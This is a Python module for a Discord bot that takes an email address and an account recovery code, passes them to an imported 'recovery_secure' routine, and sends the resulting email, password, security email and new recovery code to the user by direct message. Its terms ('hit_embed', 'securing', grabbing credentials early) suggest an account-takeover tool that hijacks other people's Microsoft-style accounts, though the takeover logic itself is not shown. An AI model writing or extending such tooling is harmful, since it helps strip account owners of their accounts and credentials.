from discord import ui
import discord
import logging

from securing.recovery_secure import recovery_secure
from securing.build_embeds import build_failure_embed
from ui.buttons.account_details import accountInfo

log = logging.getLogger(__name__)


async def _send_failure_dm(user: discord.User | discord.Member, embed: discord.Embed) -> bool:
    try:
        await user.send(embed=embed)
        return True
    except discord.Forbidden:
        return False


async def _send_early_credentials(user: discord.User | discord.Member, creds: dict) -> None:
    """DM credentials as soon as RecoverUser succeeds (before polish/secure)."""
    embed = discord.Embed(
        title="Credentials ready (securing continues…)",
        description=(
            "Recovery finished. Full securing is still running — "
            "save these now in case the next step stalls."
        ),
        color=0x2765F5,
    )
    embed.add_field(name="Email", value=f"```{creds.get('email', '?')}```", inline=False)
    embed.add_field(name="Security Email", value=f"```{creds.get('security_email', '?')}```", inline=True)
    embed.add_field(name="Password", value=f"```{creds.get('password', '?')}```", inline=True)
    embed.add_field(name="Recovery Code", value=f"```{creds.get('recovery_code', '?')}```", inline=False)
    try:
        await user.send(embed=embed)
    except discord.Forbidden:
        log.warning("Could not DM early credentials for %s", creds.get("email"))


class recoveryCodeModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Recovery Code Securing")
        self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
        self.add_item(ui.InputText(label="Recovery Code", placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", required = True))

    async def callback(self, interaction: discord.Interaction):
        email = self.children[0].value
        recovery_code = self.children[1].value

        await interaction.response.defer(ephemeral=True)

        await interaction.followup.send(
            embed=discord.Embed(
                title="Securing Account",
                description="Your account is being secured...",
                color=0x2765F5
            ),
            ephemeral=True
        )

        try:
            account = await recovery_secure(
                email = email,
                method = "rcode",
                data = {
                    "recovery_code": recovery_code
                },
                on_credentials=lambda creds: _send_early_credentials(interaction.user, creds),
            )
        except Exception as e:
            log.exception("recovery_secure crashed for %s", email)
            fail_embed = build_failure_embed(
                email,
                {},
                "An unexpected error occurred during securing.",
                error=f"{e.__class__.__name__}: {e}",
            )
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            if not await _send_failure_dm(interaction.user, fail_embed):
                await interaction.followup.send("Could not DM you — enable DMs from server members.", ephemeral=True)
            return

        if isinstance(account, dict) and account.get("failed"):
            await interaction.followup.send(embed=account["hit_embed"], ephemeral=True)
            if not await _send_failure_dm(interaction.user, account["hit_embed"]):
                await interaction.followup.send("Could not DM you — enable DMs from server members.", ephemeral=True)
            return

        if account == "invalid":
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Invalid Recovery Code",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return

        if not account:
            fail_embed = discord.Embed(
                title="Failed to secure account",
                description="Make sure your recovery code is correct and that 2FA is disabled",
                color=0x2765F5,
            )
            fail_embed.add_field(name="Email", value=f"```{email}```", inline=False)
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            await _send_failure_dm(interaction.user, fail_embed)
            return

        await interaction.user.send(
            embed = account["hit_embed"],
            view = accountInfo(
                account["details"]
            )
        )
